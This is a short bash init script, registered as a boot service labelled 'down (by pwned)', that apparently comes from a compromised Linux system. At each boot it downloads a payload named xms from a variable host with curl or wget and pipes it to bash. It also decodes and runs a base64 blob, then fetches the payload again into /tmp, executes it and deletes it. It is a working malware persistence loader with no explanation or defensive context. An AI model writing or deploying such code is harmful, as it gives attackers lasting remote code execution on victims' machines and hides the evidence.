#!/bin/bash
### BEGIN INIT INFO
# Provides:          down
# Required-Start:
# Required-Stop:
# Default-Start:     2 3 4 5
# Default-Stop:
# Short-Description: down (by pwned)
### END INIT INFO
(curl -fsSL http://$url/xms||wget -q -O- http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
